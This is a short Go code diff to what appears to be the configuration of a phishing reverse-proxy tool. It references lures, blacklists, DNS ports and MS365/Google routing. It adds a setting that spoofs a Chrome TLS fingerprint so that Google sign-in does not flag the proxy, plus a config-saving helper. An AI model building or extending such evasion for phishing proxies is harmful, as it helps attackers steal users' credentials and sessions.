@@ -62,6 +62,11 @@ type ProxyConfig struct {
 	// the flows that need it (e.g. google.com) while MS365 stays on the
 	// node's own IP.
 	Routes []string `mapstructure:"routes" json:"routes" yaml:"routes"`
+	// TLSFingerprint: when set (e.g. "chrome"), upstream TLS connections are
+	// made with a utls Chrome ClientHello instead of Go's default — required
+	// for targets that score the Go TLS fingerprint (e.g. Google sign-in).
+	// Works with or without the proxy enabled.
+	TLSFingerprint string `mapstructure:"tlsfp" json:"tlsfp" yaml:"tlsfp"`
 }
 
 type BlacklistConfig struct {
@@ -321,6 +326,11 @@ func (c *Config) SetDnsPort(port int) {
 	c.general.DnsPort = port
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("dns port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+// SaveConfig flushes in-memory settings (general/proxy/lures...) to config.json.
+func (c *Config) SaveConfig() {
 	c.cfg.WriteConfig()
 }
 
